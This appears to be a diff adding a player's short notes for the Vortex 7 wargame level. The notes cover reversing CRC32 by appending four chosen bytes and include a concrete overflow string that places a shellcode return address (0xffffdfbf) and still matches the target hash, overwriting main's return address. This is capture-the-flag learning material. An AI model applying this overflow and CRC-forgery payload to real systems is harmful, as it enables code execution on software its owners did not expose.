@@ -1,0 +1,15 @@
+Reverse CRC32? Supposedly can return any desired CRC32 hash by appending 4 bytes
+to the end of whatever message we desire.
+
+Helpful: http://www.danielvik.com/2010/10/calculating-reverse-crc.html
+
+crc32.py reverse 0x5008344d
+
+- executing that and inputting one of the resulting strings resulted in no output from vortex 7! YES.
+
+Now to use ReverseCRC from the danielvik to find bytes to append to a string
+
+With the shellcode at 0xffffdfbf, the string "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSS""\xBF\xDF\xFF\xFF""TTUUUUVVVVWWWWXXXXYYYYZZZZ0hlAcF" successfully hashes to 0xe1ca95ee and overwrites the return address of main! Nice.
+
+
+As per usual, I wrote a local wrapper to execute the bin with a clean environment, and one for the server as well.
